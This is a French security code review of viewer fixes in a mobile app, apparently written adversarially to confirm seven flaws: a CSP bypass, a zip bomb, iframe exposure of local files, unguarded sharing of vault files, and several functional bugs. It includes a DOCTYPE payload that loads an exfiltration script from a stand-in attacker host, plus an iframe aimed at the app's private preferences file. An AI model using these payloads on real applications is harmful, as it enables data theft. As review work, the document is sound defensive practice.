Voici la relecture adverse des correctifs. Les constats sont classés par sévérité. 

### 1. Contournement de la CSP via DOCTYPE malformé (Règle 1 - Les tests mentent)
**Sévérité : CRITIQUE | Statut : CONFIRMÉ**
*Fichier : `lib/screens/viewers/html_viewer_screen.dart`, lignes 62-63*

**Scénario :** Le commentaire affirme que la nouvelle méthode d'injection est robuste car elle insère la CSP juste après le `>`. Cependant, la recherche du `>` se fait par un simple `indexOf('>')`. 
Un attaquant fournit un fichier HTML commençant par : `<!DOCTYPE html foo=">"><html><head><script src="http://serveur-attaquant.com/exfil.js"></script>...`
La fonction `injectCsp` trouve le `>` à l'intérieur de l'attribut `foo` et insère la balise CSP *à l'intérieur* de la déclaration DOCTYPE : `<!DOCTYPE html foo="><meta http-equiv=... >">`. 
**Résultat :** Le test unitaire `html_csp_injection_test.dart` passe car il vérifie naïvement la présence de la chaîne `<meta...>` dans le résultat. Mais pour le moteur Chromium de la WebView, la balise `<meta>` fait partie d'un DOCTYPE invalide et n'est jamais parsée comme un élément HTML. La CSP est totalement ignorée, et le script malveillant s'exécute avec accès aux fichiers locaux (via l'iframe, voir point 3).

### 2. Zip Bomb : La garde de décompression fait confiance à l'attaquant
**Sévérité : CRITIQUE | Statut : CONFIRMÉ**
*Fichier : `lib/services/reader_service.dart`, lignes 169-174*

**Scénario :** La méthode `_entryBytes` tente de prévenir les OOM (Out Of Memory) en vérifiant `entry.size > max`. Or, dans le package `archive`, `entry.size` est la taille non compressée **déclarée dans l'en-tête du fichier ZIP (Central Directory)**. 
Un attaquant forge un fichier EPUB où l'en-tête d'un chapitre déclare `uncompressed size = 0`, mais dont les données compressées (deflate) contiennent 2 Go de zéros. 
La condition `0 > FileCaps.epubChapter` renvoie faux. Le code appelle ensuite `entry.content`. Le package `archive` lance alors la décompression (`Inflate`) jusqu'à la fin du flux compressé, allouant dynamiquement de la mémoire pour les 2 Go réels.
**Résultat :** L'application crash par OOM à l'ouverture du chapitre. Le correctif V-M5 est incomplet car il valide une métadonnée falsifiable au lieu de borner le flux de décompression réel.

### 3. Fuite visuelle par Iframe : Le correctif CSP est inopérant (Règle 2)
**Sévérité : ÉLEVÉ | Statut : CONFIRMÉ**
*Fichier : `lib/screens/viewers/html_viewer_screen.dart`, ligne 25*

**Scénario :** Le commentaire (lignes 153-160) indique que la directive `frame-src file:` ramène les iframes "dans le périmètre du document". C'est faux. La directive CSP `frame-src file:` autorise le chargement de **n'importe quel** fichier local, sans granularité de chemin.
Puisque le `NavigationDelegate` n'intercepte pas les sous-frames (comme le note justement le développeur), un attaquant peut inclure `<iframe src="file:///data/data/com.votre.app/shared_prefs/prefs.xml"></iframe>` dans son HTML.
**Résultat :** La WebView charge et affiche le fichier de préférences (ou la base de données du coffre) à l'écran. Bien que le JavaScript ne puisse pas lire le contenu de l'iframe (bloqué par la Same-Origin Policy des `file://` sur Android), l'objectif de l'attaquant de "faire afficher du contenu sensible" (cité ligne 83) est atteint. Le correctif G8 est contourné.

### 4. Régression du coffre : Partage sans garde `withShare` (Règles 2 et 3)
**Sévérité : ÉLEVÉ | Statut : CONFIRMÉ**
*Fichiers :*
- *`lib/screens/viewers/html_viewer_screen.dart`, ligne 267*
- *`lib/screens/viewers/md_viewer_screen.dart`, ligne 139*

**Scénario :** Les deux viewers appellent directement `Share.shareXFiles([XFile(widget.path)])`. Si le fichier visionné provient du coffre-fort, il s'agit d'un fichier temporaire déchiffré. L'absence du wrapper `withShare` (mentionné dans le contexte comme suspendant la purge) signifie que le timer d'inactivité du coffre n'est pas suspendu.
**Résultat :** Si l'utilisateur partage un fichier du coffre et prend du temps dans le menu de partage Android, le coffre peut se verrouiller et purger le fichier temporaire *pendant* que l'application cible tente de le lire, faisant échouer le partage. Pire, `share_plus` copiant le fichier dans son propre cache, l'absence de la mécanique de nettoyage liée à `withShare` laissera le fichier en clair dans `<cache>/share_plus/` indéfiniment.

### 5. Régression fonctionnelle : Liens d'ancrage HTML cassés (Règle 3)
**Sévérité : MOYEN | Statut : CONFIRMÉ**
*Fichier : `lib/screens/viewers/html_viewer_screen.dart`, ligne 102*

**Scénario :** La fonction `_isFileUrlAllowed` utilise `Uri.parse(url).toFilePath()` pour vérifier les navigations. Si un utilisateur clique sur un lien interne légitime dans un fichier HTML local (ex: `<a href="#chapitre2">`), l'URL interceptée sera `file:///chemin/fichier.html#chapitre2`.
La méthode `toFilePath()` de Dart lève systématiquement une `UnsupportedError` si l'URI contient un fragment (`#`) ou une query (`?`).
**Résultat :** L'exception est attrapée par le `catch (_)`, la fonction renvoie `false`, et le `NavigationDelegate` bloque la navigation. Tous les sommaires et liens d'ancrage des fichiers HTML locaux sont désormais inopérants.

### 6. Concurrence : Crash par `setState` après `dispose` (Règle 4)
**Sévérité : MOYEN | Statut : CONFIRMÉ**
*Fichier : `lib/screens/viewers/html_viewer_screen.dart`, lignes 194-198*

**Scénario :** Dans `_toggleJs`, l'application affiche une boîte de dialogue (`showDialog`) et attend la réponse de l'utilisateur (`await`). Si l'utilisateur appuie sur le bouton "Retour" d'Android, l'écran `HtmlViewerScreen` est dépilé et détruit (`dispose`), mais la boîte de dialogue (qui est sur le navigateur racine) reste affichée.
Si l'utilisateur clique ensuite sur "Activer" dans la boîte de dialogue, le code reprend, sort du `if`, et appelle `setState(() { ... })`.
**Résultat :** Crash de l'application (Fatal Error: `setState() called after dispose()`).

### 7. Jumeau oublié : Nettoyage Reader Mode incomplet (Règle 2)
**Sévérité : FAIBLE | Statut : CONFIRMÉ**
*Fichier : `lib/services/reader_service.dart`, lignes 137-141*

**Scénario :** La méthode `htmlToBlocks` a été correctement durcie pour retirer les éléments parasites (`iframe`, `form`, `nav`, `footer`, etc.) avant l'extraction du texte. Cependant, sa fonction jumelle `readEpub`, qui fait exactement le même travail d'extraction sur les chapitres XHTML, ne retire que `script` et `style`.
**Résultat :** Si un EPUB contient des balises `<nav>` ou `<footer>` avec du texte, ce texte sera extrait et polluera le mode lecture, contrairement au HTML brut où le correctif a été appliqué.

---

### Sections saines (Rien à signaler)
*   **Blocage réseau Markdown (`md_viewer_screen.dart`) :** La logique de `_imageBuilder` est solide. Le fallback sur `_blockedImage` pour tout ce qui n'est pas strictement un fichier local existant dans le périmètre du document ferme efficacement la fuite réseau (V-M4) via `gpt_markdown`. Les tentatives de contournement par protocol-relative URLs (`//`) ou encodage d'URI sont correctement neutralisées par `Uri.tryParse` et `p.isWithin`.
*   **Rechargement WebView (`html_viewer_screen.dart`) :** La réinitialisation du `WebViewController` lors du basculement JS (`_toggleJs`) est correctement gérée et n'introduit pas de fuite de mémoire ou d'état fantôme.